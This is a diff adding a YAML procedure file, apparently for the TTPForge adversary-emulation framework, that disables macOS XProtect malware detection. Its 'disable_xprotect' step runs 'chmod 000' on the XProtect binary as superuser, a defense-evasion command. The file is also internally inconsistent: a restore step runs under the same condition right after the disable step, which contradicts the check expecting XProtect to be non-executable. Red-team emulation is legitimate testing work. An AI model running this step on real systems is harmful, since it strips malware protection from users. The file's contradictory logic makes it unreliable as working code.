@@ -1,0 +1,65 @@
+id: 002-disable-xprotect
+name: Disable XProtect
+description: Disable macOS XProtect malware detection engine
+author: TTPForge
+created_date: 2026-01-30
+last_modified_date: 2026-01-30
+api_version: 2.0
+platforms:
+  - darwin
+tactics:
+  - defense_evasion
+techniques:
+  - disable_or_modify_security_tools
+
+requirements:
+  platforms:
+    - os: darwin
+  superuser: true
+
+args:
+  status:
+    description: Check XProtect status
+    type: bool
+    default: true
+  disable:
+    description: Disable XProtect
+    type: bool
+    default: false
+
+steps:
+  check_xprotect:
+    inline: ls -la /System/Library/CoreServices/XProtect.bundle/
+    description: Check if XProtect is present
+
+  disable_xprotect:
+    inline: chmod 000 /System/Library/CoreServices/XProtect.bundle/XProtect
+    description: Remove execute permissions from XProtect binary
+    condition: "{{ args.disable }}"
+
+  restore_xprotect:
+    inline: chmod 755 /System/Library/CoreServices/XProtect.bundle/XProtect
+    description: Restore XProtect permissions
+    condition: "{{ args.disable }}"
+
+checks:
+  verify_disabled:
+    inline: test ! -x /System/Library/CoreServices/XProtect.bundle/XProtect
+    expected_exit_code: 0
+    description: Verify XProtect is not executable
+
+tests:
+  default:
+    steps:
+      - check_xprotect
+    expected_exit_code: 0
+
+  dry_run:
+    steps:
+      - check_xprotect
+    expected_exit_code: 0
+
+cleanup:
+  restore_permissions:
+    inline: chmod 755 /System/Library/CoreServices/XProtect.bundle/XProtect
+    description: Restore XProtect to executable state
